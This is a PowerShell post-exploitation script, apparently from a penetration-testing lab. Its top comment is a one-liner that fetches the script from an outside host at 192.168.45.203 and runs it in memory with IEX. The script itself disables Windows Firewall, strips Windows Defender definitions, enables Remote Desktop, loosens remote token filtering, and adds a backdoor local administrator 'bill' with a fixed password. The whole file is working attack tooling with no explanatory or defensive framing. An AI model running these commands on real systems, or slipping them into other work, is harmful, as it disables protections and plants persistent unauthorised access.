# powershell -c "(new-object system.net.webclient).downloadstring('http://192.168.45.203/post_admin.ps1') | IEX"
# Ensure the script is run as Administrator
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    Write-Error "Please run this script as Administrator!"
    exit
}

Write-Host "Disabling Windows Firewall..."
netsh advfirewall set allprofiles state off

Write-Host "Removing Windows Defender definitions..."
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all

Write-Host "Enabling Remote Desktop..."
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

Write-Host "Enabling LocalAccountTokenFilterPolicy..."
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
    /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

Write-Host "Creating local admin account 'bill'..."
net user bill P@ssw0rd123 /ADD
net localgroup Administrators bill /add

Write-Host "All tasks completed."

